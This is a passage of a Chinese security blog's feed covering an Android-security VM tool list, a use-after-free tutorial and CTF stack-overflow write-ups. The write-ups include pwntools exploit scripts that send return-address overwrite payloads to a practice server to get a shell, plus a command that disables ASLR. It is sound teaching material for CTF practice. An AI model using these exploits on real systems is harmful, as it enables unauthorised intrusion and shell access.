<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623005714.png" alt=""></p>
<p>看看硬件：</p>
<ol>
<li>usb</li>
</ol>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623010117.png" alt=""></p>
<ol start="2">
<li>cpu</li>
</ol>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623010156.png" alt=""></p>
<p>说好的v8?</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623010258.png" alt=""></p>
<ol start="3">
<li>网卡</li>
</ol>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623010503.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623010528.png" alt=""></p>
<h3 id="0x05-总结">0x05 总结</h3>
<p>闲了很久，现在终于动手搞自己想搞的东西，花了一个晚上，搞完这些简单的安装配置，挺费时费力的，不过自己开心就好。最好是自己能够坚持下去，做更多有趣的事。</p>
<p><img src="https://as2.bitinn.net/uploads/5d/cjvmpwzcf000bx38hgr1oua5d.1080p.jpg" alt="12"></p>
]]></content>
        </item>
        
        <item>
            <title>MobSecVM</title>
            <link>https://kuekiko.top/posts/2019/06/mobsecvm/</link>
            <pubDate>Sun, 16 Jun 2019 00:12:44 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/06/mobsecvm/</guid>
            <description>0x00 前言 最近不知为何VM-Ubuntu炸了，试了各种方法，折腾了很久之后，终于恢复了。又浪费时间和环境斗志斗勇。自此打算自己弄一个包含了Android安全所需各种工具的环境，做个备份。防止哪天又出各种各样的问题。
项目地址：MobSecVM
下载地址：baiduyun、google_yun
0x01 环境准备  Ubuntu 18.04 LTS   Username：mobsec
Password：mobsec
  Vmware 15  0x02 Tools （不断补充）   AndroidStudio 开发全家桶带模拟器
  Radare2 逆向框架
  Frida Hook工具
  Drozer Android应用程序安全评估框架
  APKtool APK逆向工具
  BurpSuite 抓改包，安全检测
  Wireshare 抓包工具
  MobSF 应用程序自动化分析框架
  androguard 一款基于python的逆向工程，恶意软件和软件分析Android应用程序的框架。
  VScode 编辑器
  bytecode-viewer
  barf&amp;ndash;project
  jadx Dex to Java decompiler</description>
            <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3>
<p>最近不知为何VM-Ubuntu炸了，试了各种方法，折腾了很久之后，终于恢复了。又浪费时间和环境斗志斗勇。自此打算自己弄一个包含了Android安全所需各种工具的环境，做个备份。防止哪天又出各种各样的问题。</p>
<p>项目地址：<a href="">MobSecVM</a></p>
<p>下载地址：<a href="">baiduyun</a>、<a href="">google_yun</a></p>
<h3 id="0x01-环境准备">0x01 环境准备</h3>
<ul>
<li>Ubuntu 18.04 LTS</li>
</ul>
<blockquote>
<p>Username：mobsec</p>
<p>Password：mobsec</p>
</blockquote>
<ul>
<li>Vmware 15</li>
</ul>
<h3 id="0x02-tools-不断补充">0x02 Tools （不断补充）</h3>
<ul>
<li>
<p><input checked="" disabled="" type="checkbox"> <a href="http://developer.android.com/tools/studio/index.html">AndroidStudio</a> 开发全家桶带模拟器</p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> <a href="https://github.com/radare/radare2">Radare2</a> 逆向框架</p>
</li>
<li>
<p><a href="https://www.frida.re/">Frida</a> Hook工具</p>
</li>
<li>
<p><a href="https://github.com/mwrlabs/drozer">Drozer</a> Android应用程序安全评估框架</p>
</li>
<li>
<p><a href="https://github.com/iBotPeaches/Apktool">APKtool</a> APK逆向工具</p>
</li>
<li>
<p><a href="https://portswigger.net/burp">BurpSuite</a> 抓改包，安全检测</p>
</li>
<li>
<p><a href="https://www.wireshark.org/">Wireshare</a> 抓包工具</p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> 应用程序自动化分析框架</p>
</li>
<li>
<p><input disabled="" type="checkbox"> <a href="https://github.com/androguard/androguard">androguard</a>  一款基于python的逆向工程，恶意软件和软件分析Android应用程序的框架。</p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> <a href="https://code.visualstudio.com/">VScode</a> 编辑器</p>
</li>
<li>
<p><input disabled="" type="checkbox"> <a href="https://github.com/konloch/bytecode-viewer">bytecode-viewer</a></p>
</li>
<li>
<p><input disabled="" type="checkbox"> <a href="https://github.com/programa-stic/barf-project">barf&ndash;project</a></p>
</li>
<li>
<p><input checked="" disabled="" type="checkbox"> <a href="https://github.com/skylot/jadx">jadx</a> Dex to Java decompiler</p>
</li>
<li>
<p><a href="https://github.com/xtiankisutsa/MARA_Framework">MARA_Framework</a>  Mobile Application Reverse engineering and Analysis Framework.</p>
</li>
<li>
<p><a href="https://github.com/AndroBugs/AndroBugs_Framework">AndroBugs Framework</a> Android vulnerability scanner</p>
</li>
<li>
<p><a href="https://github.com/linkedin/qark">qark</a> Tool to look for several security related Android application vulnerabilities</p>
</li>
<li>
<p><a href="https://github.com/payatu/diva-android">DIVA</a> Damn Insecure and vulnerable App for Android</p>
</li>
<li>
<p><a href="https://github.com/dineshshetty/Android-InsecureBankv2">InsecureBankv2</a>  Vulnerable Android application for developers and security enthusiasts to learn about Android insecurities</p>
</li>
<li>
<p><a href="https://github.com/rafaeltoledo/android-security">Android Security Sandbox</a> An app showcase of some techniques to improve Android app security</p>
</li>
<li>
<p><a href="https://github.com/jackMannino/OWASP-GoatDroid-Project">GoatDroid</a> A fully functional and self-contained training environment for educating developers and testers on Android security</p>
</li>
<li>
<p><a href="https://github.com/tanprathan/sievePWN">sievePWN</a> An android application which exploits sieve through android components.</p>
</li>
</ul>
<h3 id="0x03-小插件">0x03 小插件</h3>
<ul>
<li>on_my_zsh</li>
<li><a href="http://plugins.jetbrains.com/plugin/3847-findbugs-idea">FindBugs-IDEA</a></li>
<li>docker</li>
</ul>
<h3 id="0x04-效果图">0x04 效果图</h3>
]]></content>
        </item>
        
        <item>
            <title>漏洞基础之3UAF</title>
            <link>https://kuekiko.top/posts/2019/03/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B9%8B3uaf/</link>
            <pubDate>Wed, 20 Mar 2019 15:37:13 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/03/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B9%8B3uaf/</guid>
            <description></description>
            <content type="html"><![CDATA[<ul>
<li>重写ing</li>
</ul>
<h3 id="0x00原理">0x00原理</h3>
<p>堆内存在释放后被直接再次使用(释放了堆块之后，未将该指针值为NULL,导致指针处于悬空状态，被释放的内存能被恶意利用) 在浏览器中比较常见的漏洞</p>
<p><strong>根本原因是：</strong></p>
<blockquote>
<p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p>
</blockquote>
<h3 id="利用">利用</h3>
<h5 id="简单利用">简单利用</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">void</span> (<span style="color:#f92672">*</span>func_ptr)(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">evil_fuc</span>(<span style="color:#66d9ef">char</span> command[])
{
system(command);
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">echo</span>(<span style="color:#66d9ef">char</span> content[])
{
printf(<span style="color:#e6db74">&#34;%s&#34;</span>,content);
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    func_ptr <span style="color:#f92672">*</span>p1<span style="color:#f92672">=</span>(func_ptr<span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));
    printf(<span style="color:#e6db74">&#34;malloc addr: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,p1);
    p1[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">=</span>echo;
    p1[<span style="color:#ae81ff">3</span>](<span style="color:#e6db74">&#34;hello world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    free(p1); <span style="color:#75715e">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针
</span><span style="color:#75715e"></span>    p1[<span style="color:#ae81ff">3</span>](<span style="color:#e6db74">&#34;hello again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); <span style="color:#75715e">//p1指针未被置空,虽然free了,但仍可使用.
</span><span style="color:#75715e"></span>    func_ptr <span style="color:#f92672">*</span>p2<span style="color:#f92672">=</span>(func_ptr<span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));<span style="color:#75715e">//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.
</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;malloc addr: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,p2);
    printf(<span style="color:#e6db74">&#34;malloc addr: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,p1);<span style="color:#75715e">//p2与p1指针指向的内存为同一地址
</span><span style="color:#75715e"></span>    p2[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">=</span>evil_fuc; <span style="color:#75715e">//在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.
</span><span style="color:#75715e"></span>    p1[<span style="color:#ae81ff">3</span>](<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180912215411.png" alt=""></p>
<h5 id="pwnablekr-uaf">pwnable.kr uaf</h5>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180912220453.png" alt=""></p>
<p>先看看源码：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt; </span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstring&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdlib&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Human</span>{
<span style="color:#66d9ef">private</span><span style="color:#f92672">:</span>
    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> give_shell(){
        system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
    }
<span style="color:#66d9ef">protected</span><span style="color:#f92672">:</span>
    <span style="color:#66d9ef">int</span> age;
    string name;
<span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> introduce(){
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;My name is &#34;</span> <span style="color:#f92672">&lt;&lt;</span> name <span style="color:#f92672">&lt;&lt;</span> endl;
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;I am &#34;</span> <span style="color:#f92672">&lt;&lt;</span> age <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34; years old&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
    }
};

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Man</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">public</span> Human{
<span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
    Man(string name, <span style="color:#66d9ef">int</span> age){
        <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> name;
        <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>age <span style="color:#f92672">=</span> age;
        }
        <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">introduce</span>(){
        Human<span style="color:#f92672">::</span>introduce();
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;I am a nice guy!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
        }
};

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Woman</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">public</span> Human{
<span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
        Woman(string name, <span style="color:#66d9ef">int</span> age){
                <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> name;
                <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>age <span style="color:#f92672">=</span> age;
        }
        <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">introduce</span>(){
                Human<span style="color:#f92672">::</span>introduce();
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;I am a cute girl!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
        }
};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]){
    Human<span style="color:#f92672">*</span> m <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Man(<span style="color:#e6db74">&#34;Jack&#34;</span>, <span style="color:#ae81ff">25</span>);
    Human<span style="color:#f92672">*</span> w <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Woman(<span style="color:#e6db74">&#34;Jill&#34;</span>, <span style="color:#ae81ff">21</span>);

    size_t len;
    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> data;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> op;
    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;1. use</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. after</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3. free</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        cin <span style="color:#f92672">&gt;&gt;</span> op;

        <span style="color:#66d9ef">switch</span>(op){
            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
                m<span style="color:#f92672">-&gt;</span>introduce();
                w<span style="color:#f92672">-&gt;</span>introduce();
                <span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
                len <span style="color:#f92672">=</span> atoi(argv[<span style="color:#ae81ff">1</span>]);
                data <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[len];
                read(open(argv[<span style="color:#ae81ff">2</span>], O_RDONLY), data, len);
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;your data is allocated&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
                <span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
                <span style="color:#66d9ef">delete</span> m;
                <span style="color:#66d9ef">delete</span> w;
                <span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
                <span style="color:#66d9ef">break</span>;
        }
    }

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;    
}
</code></pre></div><h5 id="hcft2016-fheap">HCFt2016 fheap</h5>
<h5 id="网鼎杯ctf2018-第一场-pwn-babyheap">网鼎杯CTF2018 第一场 Pwn Babyheap</h5>
<p>参考资料：</p>
<ul>
<li><a href="https://www.cnblogs.com/Ox9A82/p/5320857.html">https://www.cnblogs.com/Ox9A82/p/5320857.html</a></li>
<li><a href="https://www.cnblogs.com/alert123/p/4918041.html">https://www.cnblogs.com/alert123/p/4918041.html</a></li>
<li><a href="https://blog.csdn.net/qq_31481187/article/details/73612451">https://blog.csdn.net/qq_31481187/article/details/73612451</a></li>
<li><a href="https://www.anquanke.com/post/id/85281">https://www.anquanke.com/post/id/85281</a></li>
<li><a href="https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4">https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4</a></li>
<li><a href="https://www.anquanke.com/post/id/85281">https://www.anquanke.com/post/id/85281</a></li>
</ul>]]></content>
        </item>
        
        <item>
            <title>ROP练习</title>
            <link>https://kuekiko.top/posts/2019/02/rop%E7%BB%83%E4%B9%A0/</link>
            <pubDate>Thu, 28 Feb 2019 00:22:36 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/02/rop%E7%BB%83%E4%B9%A0/</guid>
            <description>题目列表： IP:47.106.212.155    ret2libc3
10008
  ret2shellcode
10002
  ret2libc
10005
  train.cs.nctu.edu.tw: rop
  2013-PlaidCTF-ropasaurusrex
  Defcon 2015 Qualifier: R0pbaby
10012
  train.cs.nctu.edu.tw: ret2libc
  AliCTF 2016：vss
  RCTF2015-welpwn
10010
  lctf16-pwn100
10011
  xdctf15-pwn200
10013
  WP（持续更新）：</description>
            <content type="html"><![CDATA[<h3 id="题目列表">题目列表：</h3>
<h4 id="ip47106212155-">IP:<code>47.106.212.155 </code></h4>
<ul>
<li>
<p>ret2libc3</p>
<p>10008</p>
</li>
<li>
<p>ret2shellcode</p>
<p>10002</p>
</li>
<li>
<p>ret2libc</p>
<p>10005</p>
</li>
<li>
<p>train.cs.nctu.edu.tw: rop</p>
</li>
<li>
<p>2013-PlaidCTF-ropasaurusrex</p>
</li>
<li>
<p>Defcon 2015 Qualifier: R0pbaby</p>
<p>10012</p>
</li>
<li>
<p>train.cs.nctu.edu.tw: ret2libc</p>
</li>
<li>
<p>AliCTF 2016：vss</p>
</li>
<li>
<p>RCTF2015-welpwn</p>
<p>10010</p>
</li>
<li>
<p>lctf16-pwn100</p>
<p>10011</p>
</li>
<li>
<p>xdctf15-pwn200</p>
<p>10013</p>
</li>
</ul>
<p>WP（持续更新）：</p>
]]></content>
        </item>
        
        <item>
            <title>CTF PWN刷题记录 CTFWiki_1栈溢出</title>
            <link>https://kuekiko.top/posts/2019/02/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</link>
            <pubDate>Wed, 20 Feb 2019 00:17:21 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/02/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</guid>
            <description>看CTFWiki来入门CTF-PWN (Linux和arm) 做个记录
 知识点：PWN相关知识点总结
 Linux PWN ARM PWN  题目全部来源于 CTFWiki 上所涉及题目
Linux PWN 大部分原理参考CTFWiki
栈溢出 基本栈溢出 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() { puts(&amp;#34;You Hava already controlled it.&amp;#34;); }void vulnerable() {char s[12];gets(s);puts(s);return;}int main(int argc, char **argv) {vulnerable();return 0;}# gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1stack1.c: In function ‘vulnerable’:stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’?</description>
            <content type="html"><![CDATA[<hr>
<blockquote>
<p>看CTFWiki来入门CTF-PWN  (Linux和arm) 做个记录</p>
</blockquote>
<p>知识点：<a href="">PWN相关知识点总结</a></p>
<ul>
<li>Linux PWN</li>
<li>ARM PWN</li>
</ul>
<p>题目全部来源于 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/">CTFWiki</a> 上所涉及题目</p>
<h2 id="linux-pwn">Linux PWN</h2>
<p>大部分原理参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/">CTFWiki</a></p>
<h4 id="栈溢出">栈溢出</h4>
<h5 id="基本栈溢出">基本栈溢出</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">success</span>() { puts(<span style="color:#e6db74">&#34;You Hava already controlled it.&#34;</span>); }
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>() {
  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">12</span>];
  gets(s);
  puts(s);
  <span style="color:#66d9ef">return</span>;
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
  vulnerable();
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e"># gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1
</span><span style="color:#75715e"></span>stack1.c: In function <span style="color:#960050;background-color:#1e0010">‘</span>vulnerable<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">:</span>
stack1.c:<span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> warning: implicit declaration of function <span style="color:#960050;background-color:#1e0010">‘</span>gets<span style="color:#960050;background-color:#1e0010">’</span>; did you mean <span style="color:#960050;background-color:#1e0010">‘</span>fgets<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">?</span> [<span style="color:#f92672">-</span>Wimplicit<span style="color:#f92672">-</span>function<span style="color:#f92672">-</span>declaration]
   gets(s);
   <span style="color:#f92672">^~~~</span>
   fgets
<span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>ccNeCYTO.o: In function <span style="color:#960050;background-color:#1e0010">`</span>vulnerable<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">:</span>
stack1.c:(.text<span style="color:#f92672">+</span><span style="color:#ae81ff">0x45</span>)<span style="color:#f92672">:</span> warning: the <span style="color:#960050;background-color:#1e0010">`</span>gets<span style="color:#960050;background-color:#1e0010">&#39;</span> function is dangerous and should not be used.
</code></pre></div><p><code> echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
<p>关闭完全部保护</p>
<p>步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-&gt;+ebp的长度-&gt;+返回的地址（success()的地址)</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406211946.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212108.png" alt=""></p>
<p>poc1.py</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding=utf-8</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># sh = process(&#34;./stack1&#34;)</span>
sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10000</span>)
success_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048456</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x14</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;bbbb&#39;</span> <span style="color:#f92672">+</span> p32(success_addr)
sh<span style="color:#f92672">.</span>sendline(payload)
sh<span style="color:#f92672">.</span>interactive()

</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212343.png" alt=""></p>
<hr>
<h5 id="基本rop">基本ROP</h5>
<p>ROP 攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<h6 id="ret2text">ret2text</h6>
<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p>
<p>示例程序：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406214601.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190412180957.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406220340.png" alt=""></p>
<p>所以只需ret到<code>0x0804863a</code>就能getshell</p>
<p>构造payload</p>
<ul>
<li>
<p>计算偏移量</p>
<ul>
<li>使用ragg2</li>
</ul>
<p><code>ragg2 -P 200 -r &gt; pattern.txt</code>   or <code>ragg2 -P 200 -r</code>复制下来</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#75715e"># ragg2 -P 200 -r</span>
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#
</code></pre></div><p>profile.rr2:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/rarun2
</span><span style="color:#75715e"></span>stdin<span style="color:#f92672">=</span>./pattern.txt
</code></pre></div><p><code>r2 -R profile.rr2 -d ret2text</code> or 直接<code>r2 -d ret2text</code></p>
<p><code>dc</code>后输入复制的pattern字符串</p>
<p><code>wopO eip</code>得到偏移</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406231721.png" alt=""></p>
<ul>
<li>
<p>gdb手动计算</p>
<p>下断点call处：<code>0x080486ae</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406233003.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406233035.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190412181030.png" alt=""></p>
<p>所以偏移为108+4</p>
</li>
<li>
<p>python pattern.py</p>
</li>
</ul>
</li>
<li>
<p>payload</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
  
<span style="color:#75715e"># sh = process(./ret2text)</span>
sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10001</span>)
binsh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804863a</span>
payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> p32(binsh)
sh<span style="color:#f92672">.</span>sendline(payload)
sh<span style="color:#f92672">.</span>interactive()
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190412181108.png" alt=""></p>
</li>
</ul>
<h6 id="ret2shellcode">ret2shellcode</h6>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
<ul>
<li>运行时shellcode所在区域应具有可执行权限</li>
</ul>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407123948.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132349.png" alt=""></p>
<p>strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。</p>
<p>调试看所在.bss段是否有执行的权限。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132843.png" alt=""></p>
